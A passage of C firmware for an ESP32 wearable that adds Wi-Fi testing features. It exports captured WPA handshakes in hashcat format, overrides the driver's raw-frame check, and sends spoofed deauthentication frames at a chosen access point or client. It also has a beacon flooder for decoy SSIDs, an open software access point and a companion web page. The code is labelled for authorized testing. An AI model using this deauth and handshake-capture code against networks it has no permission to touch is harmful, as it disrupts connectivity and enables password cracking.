            fwrite(line, 1, p, f); lines++;
        }
        if (e.have_anonce && e.have_mic && e.eapol_len > 0) {   /* WPA*02*mic*ap*sta*essid*anonce*eapol*mp */
            int p = 0;
            p += snprintf(line + p, sizeof line - p, "WPA*02*");
            p += hexcat(line + p, sizeof line - p, e.mic, 16);    p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.bssid, 6);   p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.sta, 6);     p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, (const uint8_t *)ssid, slen); p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.anonce, 32); p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.eapol, e.eapol_len);        p += snprintf(line + p, sizeof line - p, "*");
            p += snprintf(line + p, sizeof line - p, "00\n");     /* messagepair: M1+M2 (challenge from M1, EAPOL from M2) */
            fwrite(line, 1, p, f); lines++;
        }
    }

    fflush(f); fclose(f);
    nocsif_sdcard_unlock();
    s_hc_lines = lines;
    s_hc_state = (lines > 0) ? HC_DONE : HC_IDLE;      /* nothing to export -> back to idle */
    s_hc_running = false;
    ESP_LOGI(TAG, "hc22000: wrote %d line(s) -> %s", lines, s_hc_path);
    vTaskDeleteWithCaps(NULL);
}

static void do_export_hc(void)
{
    if (s_hc_running) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    s_hc_running = true;
    s_hc_state   = HC_BUSY;
    s_hc_lines   = 0;
    if (xTaskCreateWithCaps(hc_export_task, "wifihc", 6144, NULL, 3, NULL, MALLOC_CAP_SPIRAM) != pdPASS) {
        s_hc_running = false;
        s_hc_state   = HC_ERR;
        ESP_LOGE(TAG, "hc22000: export task create failed");
    }
}

/* ---- management-frame TX (M5-P5·1, active — authorized testing) --------------------- *
 * The FIRST active WiFi op: transmit spoofed-source deauthentication / disassociation frames to
 * solicit a reconnect (which feeds the P4·1 handshake capture) or to exercise the P4·2 detectors,
 * under an authorized test. IDF's raw-TX path runs esp_wifi_80211_tx() through the weak library
 * function ieee80211_raw_frame_sanity_check(), whose default rejects spoofed management frames;
 * defining a strong override (below) permits the transmission this feature needs. */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg; (void)arg2; (void)arg3;
    return 0;                                          /* allow raw management-frame TX */
}

/* Build + send one deauth/disassoc frame (24-byte header + 2-byte reason). addr1=dest, addr2=source
 * (spoofs the AP), addr3=BSSID. For a specific client we also send the reverse direction so both
 * ends drop the association; a broadcast destination (FF..) needs only the AP→client direction. */
static void mgmt_tx_fire(void)
{
    if (!s_tx_active || !s_mon_active || !s_tx_have_target) {
        return;
    }
    uint8_t f[26];
    f[0] = s_tx_disassoc ? 0xA0 : 0xC0;                /* mgmt subtype 10 (disassoc) / 12 (deauth) */
    f[1] = 0x00;
    f[2] = 0x00; f[3] = 0x00;                          /* duration */
    memcpy(&f[4],  s_tx_client, 6);                    /* addr1 = destination */
    memcpy(&f[10], s_tx_bssid,  6);                    /* addr2 = source (spoof the AP) */
    memcpy(&f[16], s_tx_bssid,  6);                    /* addr3 = BSSID */
    f[22] = 0x00; f[23] = 0x00;                        /* sequence (system may override) */
    f[24] = 0x07; f[25] = 0x00;                        /* reason 7: class-3 frame from nonassoc STA */
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false);
    if (e == ESP_OK) {
        s_tx_count++;
    }
    if (!s_tx_logged) {                                /* one-shot: confirm raw TX is permitted */
        s_tx_logged = true;
        ESP_LOGW(TAG, "mgmt-tx first frame -> %s", esp_err_to_name(e));
    }
    bool broadcast = true;
    for (int i = 0; i < 6; i++) { if (s_tx_client[i] != 0xFF) { broadcast = false; break; } }
    if (!broadcast) {                                  /* reverse direction (client→AP) too */
        memcpy(&f[4],  s_tx_bssid,  6);
        memcpy(&f[10], s_tx_client, 6);
        if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false) == ESP_OK) {
            s_tx_count++;
        }
    }
}

/* Periodic transmit + rate sampler (esp_timer task, off the LVGL task). */
static void mgmt_tx_tick(void *arg)
{
    (void)arg;
    if (!s_tx_active) {
        return;
    }
    mgmt_tx_fire();
    int64_t now = esp_timer_get_time();
    int64_t dt = now - s_tx_rate_t0;
    if (dt >= 1000000) {                               /* ~1 s window */
        s_tx_rate = (uint32_t)((int64_t)(s_tx_count - s_tx_rate_base) * 1000000 / dt);
        s_tx_rate_base = s_tx_count;
        s_tx_rate_t0 = now;
    }
}

static void do_mgmt_tx_target(const uint8_t bssid[6], int channel, const char *ssid)
{
    memcpy(s_tx_bssid, bssid, 6);
    s_tx_channel = (channel >= 1 && channel <= 13) ? (uint8_t)channel : 1;
    snprintf(s_tx_ssid, sizeof s_tx_ssid, "%s", ssid ? ssid : "");
    s_tx_have_target = true;
    if (s_tx_active) {
        do_mon_chan(s_tx_channel);                     /* re-lock to the new target's channel */
    }
    ESP_LOGI(TAG, "mgmt-tx target %02x:%02x:%02x:%02x:%02x:%02x ch %d (%s)",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], s_tx_channel,
             s_tx_ssid[0] ? s_tx_ssid : "hidden");
}

static void do_mgmt_tx_on(void)
{
    if (s_tx_active) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_tx_have_target) {
        ESP_LOGW(TAG, "mgmt-tx: no target selected");
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {          /* the radio must be up on a channel */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {
        ESP_LOGW(TAG, "mgmt-tx: monitor did not start");
        return;
    }
    do_mon_chan(s_tx_channel);                          /* hold the target's channel */
    s_tx_count = 0;
    s_tx_rate = 0;
    s_tx_rate_base = 0;
    s_tx_rate_t0 = esp_timer_get_time();
    s_tx_logged = false;                                /* re-log the first TX result this session */
    if (s_tx_timer == NULL) {
        const esp_timer_create_args_t a = { .callback = mgmt_tx_tick, .name = "wifimgmttx" };
        if (esp_timer_create(&a, &s_tx_timer) != ESP_OK) {
            ESP_LOGE(TAG, "mgmt-tx: timer create failed");
            return;
        }
    }
    s_tx_active = true;
    esp_timer_start_periodic(s_tx_timer, 100000);      /* 100 ms → ~10–20 frames/s (bounded) */
    ESP_LOGW(TAG, "mgmt-tx ON (%s) -> %02x:%02x:%02x:%02x:%02x:%02x ch %d",
             s_tx_disassoc ? "disassoc" : "deauth",
             s_tx_bssid[0], s_tx_bssid[1], s_tx_bssid[2],
             s_tx_bssid[3], s_tx_bssid[4], s_tx_bssid[5], s_tx_channel);
}

static void do_mgmt_tx_off(void)
{
    if (!s_tx_active) {
        return;
    }
    s_tx_active = false;
    if (s_tx_timer) {
        esp_timer_stop(s_tx_timer);
    }
    ESP_LOGI(TAG, "mgmt-tx OFF (%u frames)", (unsigned)s_tx_count);
}

/* ---- beacon TX (M5-P5·2, active — authorized testing) ------------------------------- *
 * Advertises N decoy networks by transmitting beacon frames, each with a distinct
 * locally-administered BSSID and a generated "NocSif-NN" SSID (deliberately our own name — it does
 * not impersonate a real network). Reuses the P5·1 raw-TX override. */

/* Deterministic, unique locally-administered BSSID per decoy index (02:4E:6F:63:hi:lo). */
static void beacon_bssid(uint8_t out[6], int idx)
{
    out[0] = 0x02; out[1] = 0x4E; out[2] = 0x6F; out[3] = 0x63;  /* 0x02 = locally administered */
    out[4] = (uint8_t)((idx >> 8) & 0xFF);
    out[5] = (uint8_t)(idx & 0xFF);
}

/* Build one beacon frame (header + fixed params + SSID/rates/DS-param IEs). Returns the length. */
static int beacon_build(uint8_t *f, const uint8_t bssid[6], const char *ssid, uint8_t channel)
{
    int n = 0;
    f[n++] = 0x80; f[n++] = 0x00;                     /* FC: management, subtype 8 (beacon) */
    f[n++] = 0x00; f[n++] = 0x00;                     /* duration */
    memset(&f[n], 0xFF, 6); n += 6;                   /* addr1 = broadcast */
    memcpy(&f[n], bssid, 6); n += 6;                  /* addr2 = BSSID */
    memcpy(&f[n], bssid, 6); n += 6;                  /* addr3 = BSSID */
    f[n++] = 0x00; f[n++] = 0x00;                     /* sequence */
    memset(&f[n], 0, 8); n += 8;                      /* timestamp */
    f[n++] = 0x64; f[n++] = 0x00;                     /* beacon interval: 100 TU */
    f[n++] = 0x01; f[n++] = 0x00;                     /* capability: ESS */
    int slen = (int)strlen(ssid); if (slen > 32) slen = 32;
    f[n++] = 0x00; f[n++] = (uint8_t)slen;            /* SSID IE (tag 0) */
    memcpy(&f[n], ssid, slen); n += slen;
    f[n++] = 0x01; f[n++] = 0x08;                     /* supported rates IE (tag 1) */
    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8B; f[n++] = 0x96;
    f[n++] = 0x0C; f[n++] = 0x12; f[n++] = 0x18; f[n++] = 0x24;
    f[n++] = 0x03; f[n++] = 0x01; f[n++] = channel;   /* DS parameter set IE (tag 3): channel */
    return n;
}

/* ---- beacon SSID list (managed by the UI; persisted to NVS) ------------------------- */

/* Save the whole list to NVS (count + per-index SSID/enabled). Snapshots under the lock, then does
 * the flash I/O off-lock. Called after each mutation (LVGL task; infrequent). */
static void beacon_persist(void)
{
    bcn_entry_t local[BCN_MAX];
    int cnt;
    portENTER_CRITICAL(&s_bcn_mux);
    cnt = s_bcn_cnt;
    memcpy(local, s_bcn, sizeof(bcn_entry_t) * (cnt < 0 ? 0 : cnt));
    portEXIT_CRITICAL(&s_bcn_mux);

    nocsif_settings_set_i32("bc_cnt", cnt);
    for (int i = 0; i < cnt; i++) {
        char k[12];
        snprintf(k, sizeof k, "bc_s%d", i); nocsif_settings_set_str(k, local[i].ssid);
        snprintf(k, sizeof k, "bc_e%d", i); nocsif_settings_set_i32(k, local[i].en ? 1 : 0);
    }
}

/* Load the list from NVS once (idempotent). Reads off-lock, publishes under the lock. */
static void beacon_ensure_loaded(void)
{
    if (s_bcn_loaded) {
        return;
    }
    s_bcn_loaded = true;                              /* set first: a concurrent caller skips */
    int cnt = nocsif_settings_get_i32("bc_cnt", 0);
    if (cnt < 0) cnt = 0;
    if (cnt > BCN_MAX) cnt = BCN_MAX;
    for (int i = 0; i < cnt; i++) {
        char k[12], sbuf[WIFI_SSID_MAX];
        snprintf(k, sizeof k, "bc_s%d", i);
        nocsif_settings_get_str(k, sbuf, sizeof sbuf, "");
        if (!sbuf[0]) continue;
        snprintf(k, sizeof k, "bc_e%d", i);
        int en = nocsif_settings_get_i32(k, 1);
        portENTER_CRITICAL(&s_bcn_mux);
        if (s_bcn_cnt < BCN_MAX) {
            memcpy(s_bcn[s_bcn_cnt].ssid, sbuf, sizeof s_bcn[s_bcn_cnt].ssid);
            s_bcn[s_bcn_cnt].en = (en != 0);
            s_bcn_cnt++;
        }
        portEXIT_CRITICAL(&s_bcn_mux);
    }
    s_bcn_gen++;
}

int nocsif_wifi_beacon_count(void)
{
    beacon_ensure_loaded();
    return s_bcn_cnt;
}

uint32_t nocsif_wifi_beacon_gen(void) { return s_bcn_gen; }

bool nocsif_wifi_beacon_get(int idx, char *out, size_t len, bool *en)
{
    beacon_ensure_loaded();
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    if (idx >= 0 && idx < s_bcn_cnt) {
        if (out && len) { snprintf(out, len, "%s", s_bcn[idx].ssid); }
        if (en) { *en = s_bcn[idx].en; }
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    return ok;
}

bool nocsif_wifi_beacon_add(const char *ssid)
{
    beacon_ensure_loaded();
    if (!ssid || !ssid[0]) {
        return false;
    }
    char clean[WIFI_SSID_MAX];
    snprintf(clean, sizeof clean, "%s", ssid);        /* truncates to 32 chars */
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    bool dup = false;
    for (int i = 0; i < s_bcn_cnt; i++) {
        if (strcmp(s_bcn[i].ssid, clean) == 0) { dup = true; break; }
    }
    if (!dup && s_bcn_cnt < BCN_MAX) {
        memcpy(s_bcn[s_bcn_cnt].ssid, clean, sizeof clean);
        s_bcn[s_bcn_cnt].en = true;
        s_bcn_cnt++;
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    if (ok) { s_bcn_gen++; beacon_persist(); }
    return ok;
}

void nocsif_wifi_beacon_remove(int idx)
{
    beacon_ensure_loaded();
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    if (idx >= 0 && idx < s_bcn_cnt) {
        for (int i = idx; i < s_bcn_cnt - 1; i++) {
            s_bcn[i] = s_bcn[i + 1];
        }
        s_bcn_cnt--;
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    if (ok) { s_bcn_gen++; beacon_persist(); }
}

void nocsif_wifi_beacon_rename(int idx, const char *ssid)
{
    beacon_ensure_loaded();
    if (!ssid || !ssid[0]) {
        return;
    }
    char clean[WIFI_SSID_MAX];
    snprintf(clean, sizeof clean, "%s", ssid);
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    if (idx >= 0 && idx < s_bcn_cnt) {
        memcpy(s_bcn[idx].ssid, clean, sizeof clean);
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    if (ok) { s_bcn_gen++; beacon_persist(); }
}

void nocsif_wifi_beacon_toggle(int idx)
{
    beacon_ensure_loaded();
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    if (idx >= 0 && idx < s_bcn_cnt) {
        s_bcn[idx].en = !s_bcn[idx].en;
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    if (ok) { s_bcn_gen++; beacon_persist(); }
}

/* Append up to `n` generated "NocSif-NN" decoy names (skips duplicates / respects BCN_MAX). */
void nocsif_wifi_beacon_add_decoys(int n)
{
    beacon_ensure_loaded();
    int added = 0;
    for (int i = 1; i <= 99 && added < n; i++) {
        char name[WIFI_SSID_MAX];
        snprintf(name, sizeof name, "NocSif-%02d", i);
        if (nocsif_wifi_beacon_add(name)) added++;    /* add() dedups + persists each */
    }
}

/* Count of currently-enabled entries (the ones that will actually transmit). */
static int beacon_enabled_count(void)
{
    int c = 0;
    portENTER_CRITICAL(&s_bcn_mux);
    for (int i = 0; i < s_bcn_cnt; i++) { if (s_bcn[i].en) c++; }
    portEXIT_CRITICAL(&s_bcn_mux);
    return c;
}

/* Emit one beacon for each ENABLED SSID (esp_timer task, off the LVGL task). Snapshots the enabled
 * entries under the lock into a static scratch (esp_timer task is single-threaded), then transmits
 * off-lock — never holding the spinlock across esp_wifi_80211_tx. */
static bcn_entry_t s_bcn_snap[BCN_MAX];
static void beacon_tx_fire(void)
{
    if (!s_bcn_active || !s_mon_active) {
        return;
    }
    int m = 0;
    portENTER_CRITICAL(&s_bcn_mux);
    for (int i = 0; i < s_bcn_cnt; i++) {
        if (s_bcn[i].en) { s_bcn_snap[m++] = s_bcn[i]; }
    }
    portEXIT_CRITICAL(&s_bcn_mux);

    uint8_t f[80];
    int ch = (s_mon_chan >= 1 && s_mon_chan <= 13) ? s_mon_chan : 1;
    for (int i = 0; i < m; i++) {
        uint8_t bssid[6];
        beacon_bssid(bssid, i);
        int len = beacon_build(f, bssid, s_bcn_snap[i].ssid, (uint8_t)ch);
        if (esp_wifi_80211_tx(WIFI_IF_STA, f, len, false) == ESP_OK) {
            s_bcn_frames++;
        }
    }
}

static void beacon_tx_tick(void *arg)
{
    (void)arg;
    if (!s_bcn_active) {
        return;
    }
    beacon_tx_fire();
    int64_t now = esp_timer_get_time();
    int64_t dt = now - s_bcn_rate_t0;
    if (dt >= 1000000) {                               /* ~1 s window */
        s_bcn_rate = (uint32_t)((int64_t)(s_bcn_frames - s_bcn_rate_base) * 1000000 / dt);
        s_bcn_rate_base = s_bcn_frames;
        s_bcn_rate_t0 = now;
    }
}

static void do_beacon_on(void)
{
    if (s_bcn_active) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (beacon_enabled_count() <= 0) {                  /* nothing to advertise */
        ESP_LOGW(TAG, "beacon: no enabled SSIDs; not starting");
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {          /* the radio must be up on a channel */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {
        ESP_LOGW(TAG, "beacon: monitor did not start");
        return;
    }
    do_mon_chan(s_mon_chan);                            /* hold a channel so the decoys appear stable */
    s_bcn_frames = 0;
    s_bcn_rate = 0;
    s_bcn_rate_base = 0;
    s_bcn_rate_t0 = esp_timer_get_time();
    if (s_bcn_timer == NULL) {
        const esp_timer_create_args_t a = { .callback = beacon_tx_tick, .name = "wifibeacon" };
        if (esp_timer_create(&a, &s_bcn_timer) != ESP_OK) {
            ESP_LOGE(TAG, "beacon: timer create failed");
            return;
        }
    }
    s_bcn_active = true;
    esp_timer_start_periodic(s_bcn_timer, 100000);      /* 100 ms → each SSID beaconed ~10x/s */
    ESP_LOGW(TAG, "beacon-tx ON (%d SSIDs, ch %d)", beacon_enabled_count(), s_mon_chan);
}

static void do_beacon_off(void)
{
    if (!s_bcn_active) {
        return;
    }
    s_bcn_active = false;
    if (s_bcn_timer) {
        esp_timer_stop(s_bcn_timer);
    }
    ESP_LOGI(TAG, "beacon-tx OFF (%u frames)", (unsigned)s_bcn_frames);
}

/* ---- software access point (M5-P5·3, active — authorized testing) -------------------- */

/* Prime the AP config from NVS once (idempotent). Called at init and lazily by the getters/worker. */
static void ap_cfg_ensure_loaded(void)
{
    if (s_ap_cfg_loaded) {
        return;
    }
    s_ap_cfg_loaded = true;                           /* set first: a concurrent caller skips */
    char buf[WIFI_SSID_MAX];
    nocsif_settings_get_str(K_AP_SSID, buf, sizeof buf, AP_SSID_DEF);
    portENTER_CRITICAL(&s_sap_mux);
    snprintf(s_ap_ssid, sizeof s_ap_ssid, "%s", buf[0] ? buf : AP_SSID_DEF);
    portEXIT_CRITICAL(&s_sap_mux);
    int ch = nocsif_settings_get_i32(K_AP_CHAN, 1);
    s_ap_channel = (ch >= 1 && ch <= 13) ? ch : 1;
    s_ap_hidden  = nocsif_settings_get_i32(K_AP_HIDDEN, 0) != 0;
}

/* Push the cached config into the driver as the AP config (worker only; the SSID is copied out of the
 * spinlock-guarded cache first). Applied before start, and again live on a reconfigure. */
static void apply_ap_config(void)
{
    char ssid[WIFI_SSID_MAX];
    if (s_ap_ssid_ov[0]) {                            /* §4.8a companion overrides the SSID for its session */
        snprintf(ssid, sizeof ssid, "%s", s_ap_ssid_ov);
    } else {
        portENTER_CRITICAL(&s_sap_mux);
        memcpy(ssid, s_ap_ssid, sizeof ssid);
        portEXIT_CRITICAL(&s_sap_mux);
    }
    if (ssid[0] == '\0') {
        snprintf(ssid, sizeof ssid, "%s", AP_SSID_DEF);
    }

    wifi_config_t wc = { 0 };
    snprintf((char *)wc.ap.ssid, sizeof wc.ap.ssid, "%s", ssid);
    wc.ap.ssid_len       = (uint8_t)strlen((char *)wc.ap.ssid);
    wc.ap.channel        = (uint8_t)((s_ap_channel >= 1 && s_ap_channel <= 13) ? s_ap_channel : 1);
    /* §4.8a companion may secure its AP with WPA2 (password staged in s_ap_pass_ov; ≥8 chars = WPA2's
     * minimum). Everything else — software AP, captive portal — stays OPEN as shipped. */
    if (s_ap_pass_ov[0] && strlen(s_ap_pass_ov) >= 8) {
        wc.ap.authmode = WIFI_AUTH_WPA2_PSK;
        snprintf((char *)wc.ap.password, sizeof wc.ap.password, "%s", s_ap_pass_ov);
        wc.ap.pmf_cfg.required = false;
    } else {
        wc.ap.authmode = WIFI_AUTH_OPEN;              /* open AP (software AP · portal · unsecured companion) */
    }
    wc.ap.ssid_hidden    = s_ap_hidden ? 1 : 0;
    wc.ap.max_connection = (uint8_t)((s_ap_maxconn >= 1 && s_ap_maxconn <= AP_CLI_MAX) ? s_ap_maxconn : 4);
    wc.ap.beacon_interval = 100;
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_AP, &wc));
}

/* Refresh the connected-client snapshot off the LVGL task (esp_timer). The driver association table is
 * the source of truth; the DHCP-server lease table fills each client's IP. Publishes lock-free into the
 * inactive buffer, then flips the index. Single writer (this timer), so no lock on the snapshot. */
static void ap_tick(void *arg)
{
    (void)arg;
    if (!s_ap_active) {
        return;
    }
    wifi_sta_list_t sl;
    if (esp_wifi_ap_get_sta_list(&sl) != ESP_OK) {
        sl.num = 0;
    }
    int w = s_ap_cli_i ^ 1;                           /* fill the inactive buffer */
    int cnt = 0;
    esp_netif_pair_mac_ip_t pairs[AP_CLI_MAX];
    for (int i = 0; i < sl.num && cnt < AP_CLI_MAX; i++) {
        memcpy(s_ap_cli[w][cnt].mac, sl.sta[i].mac, 6);
        s_ap_cli[w][cnt].rssi  = sl.sta[i].rssi;
        s_ap_cli[w][cnt].ip[0] = '\0';
        memcpy(pairs[cnt].mac, sl.sta[i].mac, 6);      /* MAC in, IP out */
        memset(&pairs[cnt].ip, 0, sizeof pairs[cnt].ip);
        cnt++;
    }
    if (cnt > 0 && s_ap_netif &&
        esp_netif_dhcps_get_clients_by_mac(s_ap_netif, cnt, pairs) == ESP_OK) {
        for (int i = 0; i < cnt; i++) {
            if (pairs[i].ip.addr != 0) {               /* 0 = no lease handed out yet */
                snprintf(s_ap_cli[w][i].ip, sizeof s_ap_cli[w][i].ip,
                         IPSTR, IP2STR(&pairs[i].ip));
            }
        }
    }
    /* structural change vs the published buffer (count or MAC set) -> bump gen so the list rebuilds */
    int cur = s_ap_cli_i;
    bool changed = (cnt != s_ap_cli_cnt[cur]);
    for (int i = 0; !changed && i < cnt; i++) {
        if (memcmp(s_ap_cli[w][i].mac, s_ap_cli[cur][i].mac, 6) != 0) {
            changed = true;
        }
    }
    s_ap_cli_cnt[w] = cnt;
    s_ap_cli_i = w;                                    /* publish atomically */
    if (changed) {
        s_ap_cli_gen++;
        refresh_strings();                             /* the client count feeds the detail line */
    }
}

/* Drop the AP to a stopped radio in STA mode (no restart). Shared by the Stop path (do_ap_off, which
 * then restarts STA + rejoins) and the STA entry points (which start their own STA flow). */
static void ap_teardown(void)
{
    if (!s_ap_active) {
        return;
    }
    companion_stop();                                 /* §4.8a: the companion surface rides on the AP too */
    portal_stop();                                    /* the portal rides on the AP — drop it first */
    if (s_ap_timer) {
        esp_timer_stop(s_ap_timer);
    }
    s_ap_active = false;
    s_ap_cli_cnt[0] = s_ap_cli_cnt[1] = 0;
    s_ap_cli_i = 0;
    s_ap_cli_gen++;
    s_ap_ip[0] = '\0';
    esp_wifi_stop();                                  /* AP_STOP */
    s_sta_started = false;
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_STA));
    publish_current_mac();                            /* STA MAC back in the readout */
    ESP_LOGI(TAG, "software AP OFF");
}

static void do_ap_on(void)
{
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!bring_up()) {
        return;
    }
    ap_cfg_ensure_loaded();

    if (s_ap_active) {                                /* already up -> live reconfigure */
        apply_ap_config();
        ESP_LOGI(TAG, "software AP reconfigured (ch %d %s)",
                 s_ap_channel, s_ap_hidden ? "hidden" : "visible");
        refresh_strings();
        return;
    }

    /* Single radio: suspend capture + the STA link (remember it so Stop can restore it). */
    s_ap_prev_connected = s_connected;
    monitor_teardown();
    s_want_connect = false;                           /* the disconnect handler must not retry */
    if (s_connected || s_sta_started) {
        esp_wifi_disconnect();
    }
    s_connected = false;
    s_join_state = NOCSIF_WIFI_JOIN_IDLE;
    clear_netinfo();

    if (s_ap_netif == NULL) {
        s_ap_netif = esp_netif_create_default_wifi_ap();   /* default AP netif = built-in DHCP server */
        if (s_ap_netif == NULL) {
            ESP_LOGE(TAG, "create_default_wifi_ap failed");
            publish_status("err");
            publish_detail("AP init failed.");
            return;
        }
    }

    if (s_sta_started) {
        esp_wifi_stop();                              /* clean mode switch (STA_STOP follows) */
        s_sta_started = false;
    }
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_AP));
    apply_ap_config();

    esp_err_t e = esp_wifi_start();
    if (e != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_start (AP): %s", esp_err_to_name(e));
        publish_status("err");
        publish_detail("AP failed to start.");
        esp_wifi_set_mode(WIFI_MODE_STA);             /* leave a sane mode behind */
        return;
    }

    uint8_t apmac[6];                                 /* the AP's own MAC + gateway IP for the readout */
    if (esp_wifi_get_mac(WIFI_IF_AP, apmac) == ESP_OK) {
        char s[18];
        format_mac(s, sizeof s, apmac);
        publish_mac_str(s);
    }
    esp_netif_ip_info_t ipinfo;
    if (esp_netif_get_ip_info(s_ap_netif, &ipinfo) == ESP_OK) {
        snprintf(s_ap_ip, sizeof s_ap_ip, IPSTR, IP2STR(&ipinfo.ip));
    }

    s_ap_cli_cnt[0] = s_ap_cli_cnt[1] = 0;            /* start with an empty client list */
    s_ap_cli_i = 0;
    s_ap_cli_gen++;
    if (s_ap_timer == NULL) {
        const esp_timer_create_args_t ta = { .callback = ap_tick, .name = "wifiap" };
        ESP_ERROR_CHECK_WITHOUT_ABORT(esp_timer_create(&ta, &s_ap_timer));
    }
    if (s_ap_timer) {
        esp_timer_start_periodic(s_ap_timer, 750000);  /* 750 ms client-list refresh */
    }

    s_ap_active = true;
    s_enabled = true;
    ESP_LOGW(TAG, "software AP ON: \"%s\" ch %d %s (max %d) ip %s; int-dma free=%u",
             s_ap_ssid, s_ap_channel, s_ap_hidden ? "hidden" : "visible",
             s_ap_maxconn, s_ap_ip[0] ? s_ap_ip : "?",
             (unsigned)nocsif_int_dma_free());
    refresh_strings();
}

static void do_ap_off(void)
{
    if (!s_ap_active) {
        return;
    }
    bool rejoin = s_ap_prev_connected && s_ssid[0] && s_autojoin;
    ap_teardown();                                    /* radio now stopped in STA mode */
    s_want_connect = rejoin;
    if (rejoin) {
        s_retry = 0;
        s_auth_fail = false;
        s_join_state = NOCSIF_WIFI_JOIN_JOINING;
        apply_config();
    }
    ensure_started();                                 /* STA_START -> try_connect() if wanted */
    if (s_sta_started && rejoin) {
        try_connect();
    }
    refresh_strings();
}

/* ============================ §4.8a Companion control surface (L4) — P1 ==================== *
 * Reuses the shipped software-AP bring-up (open AP; s_ap_ssid_ov gives it a device-name SSID, honoured
 * by apply_ap_config) and layers an mDNS responder + a routed HTTP server (its own handle) on top —
 * the same "ride on the AP" pattern the captive portal uses, but owner-scope and mutually exclusive
 * with the portal. Bluetooth is NOT touched (the controller is resident since RAM Phase 2, so the
 * surface coexists with the phone link); here we log heap health and fail safe if the AP or HTTP
 * can't start. The HTTP server task runs on a PSRAM stack (P4): an internal stack alive across a
 * sustained WiFi transfer competes with WiFi's dynamic RX buffers for the same scarce pool (the §4.10
 * download lesson), and the /sd file browser streams multi-MB files through this task. */

/* The served control page (P2 redesign + P3 live): a self-contained styled surface (no external assets)
 * that MIRRORS the watch. It fetches GET /api/menu and renders the same three Home categories
 * (Cyber/Life/System) with their real rows — radio-disruptive rows confirm before launching (warn flag).
 * Below the menu sits the Control Center (flash/DND/Movie toggles + brightness/volume sliders). Live
 * state (screen title, toggles, sliders, focused-field flag) arrives over the /ws WebSocket (falling
 * back to /api/ping polling); when the watch reports a focused text field, a bottom bar lets the phone
 * raise its own native keyboard (a hidden input) so typing rides /api/type + /api/key. P4 = /sd browser. */
static const char COMP_PAGE_HTML[] =
"<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
"<title>NocSif Companion</title><style>"
":root{--bg:#0b0b0d;--panel:#141418;--edge:#2a2a31;--ink:#c9c9cf;--dim:#8c8c92;--accent:#8b7bd8;--warn:#d8b24a}"
"*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);touch-action:manipulation;"
"font-family:ui-monospace,Menlo,Consolas,monospace;-webkit-font-smoothing:antialiased}"
".wrap{max-width:520px;margin:0 auto;padding:22px 18px 120px}"
"h1{font-family:Georgia,'Times New Roman',serif;font-weight:600;font-size:26px;letter-spacing:.5px;"
"margin:6px 0 2px;color:#e6e6ea}.sub{color:var(--dim);font-size:12px;margin-bottom:20px}"
".card{background:var(--panel);border:1px solid var(--edge);border-radius:12px;padding:16px;margin:12px 0}"
".dot{display:inline-block;width:9px;height:9px;border-radius:50%;background:var(--accent);"
"margin-right:8px;box-shadow:0 0 8px var(--accent);vertical-align:middle}.dot.off{background:#555;box-shadow:none}"
".row{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid var(--edge);"
"font-size:14px}.row:last-child{border-bottom:0}.row .k{color:var(--dim)}"
".btn{display:block;width:100%;background:#1b1b21;border:1px solid var(--edge);border-radius:9px;"
"color:var(--ink);font:inherit;font-size:13px;padding:11px 6px;cursor:pointer;"
"touch-action:manipulation;-webkit-tap-highlight-color:transparent;user-select:none}"
".btn:active{border-color:var(--accent);color:#fff}.btn.on{border-color:var(--accent);color:#fff;background:#241f38}"
".grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}"
".nav{display:flex;gap:8px;margin:2px 0 14px}.nav .btn{font-size:14px;padding:12px}"
".ct{font-size:12px;color:var(--dim);margin:18px 0 8px;text-transform:uppercase;letter-spacing:.08em}"
".cat{display:flex;align-items:center;justify-content:space-between;width:100%;background:var(--panel);"
"border:1px solid var(--edge);border-radius:10px;color:#e6e6ea;font:inherit;font-size:15px;"
"font-family:Georgia,serif;padding:13px 14px;margin:8px 0 0;cursor:pointer}"
".cat .car{color:var(--dim);font-size:12px;transition:transform .15s}.cat.open .car{transform:rotate(90deg)}"
/* nested sub-menus use display-toggle (not max-height) so arbitrary depth never clips */
".rows{display:none}.rows.open{display:block}"
